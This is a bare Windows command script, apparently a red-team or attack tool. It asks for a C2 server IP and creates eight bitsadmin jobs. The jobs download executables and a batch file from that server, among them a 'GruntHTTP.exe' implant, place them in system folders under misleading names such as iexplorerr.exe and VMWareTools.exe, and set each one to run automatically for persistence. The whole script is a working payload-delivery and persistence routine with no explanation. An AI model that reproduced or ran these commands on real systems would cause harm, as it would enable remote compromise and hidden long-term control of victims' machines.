$C2 = Read-Host -Prompt 'Please enter in the IP of your C2 Server'

bitsadmin /create cleanup
bitsadmin /addfile cleanup "http://$C2:4444/GruntHTTP.exe" "C:\Users\Administrator\Downloads\GruntHTTP.exe"
bitsadmin /SetNotifyCmdLine cleanup "start /B C:\Users\Administrator\Downloads\GruntHTTP.exe" NUL
bitsadmin /SetMinRetryDelay "cleanup" 60
bitsadmin /resume cleanup

bitsadmin /create sysinit
bitsadmin /addfile sysinit "$C2:80/iexplorerr.exe" "C:\Program Files\Common Files\System\iexplorerr.exe"
bitsadmin /SetNotifyCmdLine sysinit "start /B C:\Program Files\Common Files\System\iexplorerr.exe" NUL
bitsadmin /SetMinRetryDelay "sysinit" 60
bitsadmin /resume sysinit

bitsadmin /create time
bitsadmin /addfile time "$C2:443/PowerHell.bat" "C:\Windows\System32\PowerHell.bat"
bitsadmin /SetNotifyCmdLine time "C:\Windows\System32\PowerHell.bat" NUL
bitsadmin /SetMinRetryDelay "time" 60
bitsadmin /resume time

bitsadmin /create Power
bitsadmin /addfile Power "$C2:445/PowerManagement.exe" "C:\Program Files\Mozilla Firefox\PowerManagement.exe"
bitsadmin /SetNotifyCmdLine Power "start /B C:\Program Files\Mozilla Firefox\PowerManagement.exe" NUL
bitsadmin /SetMinRetryDelay "Power" 60
bitsadmin /resume Power

bitsadmin /create Tools
bitsadmin /addfile Tools "$C2:3389/VMWareTools.exe" "C:\Users\Public\VMWareTools.exe"
bitsadmin /SetNotifyCmdLine Tools "start /B C:\Users\Public\VMWareTools.exe" NUL
bitsadmin /SetMinRetryDelay "Tools" 60
bitsadmin /resume Tools

bitsadmin /create Disk
bitsadmin /addfile Disk "$C2:135/DiskHelper.exe" "C:\Windows\drivers\DiskHelper.exe"
bitsadmin /SetNotifyCmdLine Disk "start /B C:\Windows\drivers\DiskHelper.exe" NUL
bitsadmin /SetMinRetryDelay "Disk" 60
bitsadmin /resume Disk

bitsadmin /create Audio
bitsadmin /addfile Audio "$C2:445/audio.exe" "C:\Windows\DigitalLocker\en-us\audio.exe"
bitsadmin /SetNotifyCmdLine Audio "start /B C:\Windows\DigitalLocker\en-us\audio.exe" NUL
bitsadmin /SetMinRetryDelay "Audio" 60
bitsadmin /resume Audio

bitsadmin /create Log
bitsadmin /addfile Log "$C2:80/LogMGMT.exe" "C:\Windows\Globalization\ELS\LogMGMT.exe"
bitsadmin /SetNotifyCmdLine Log "start /B C:\Windows\Globalization\ELS\LogMGMT.exe" NUL
bitsadmin /SetMinRetryDelay "Log" 60
bitsadmin /resume Log
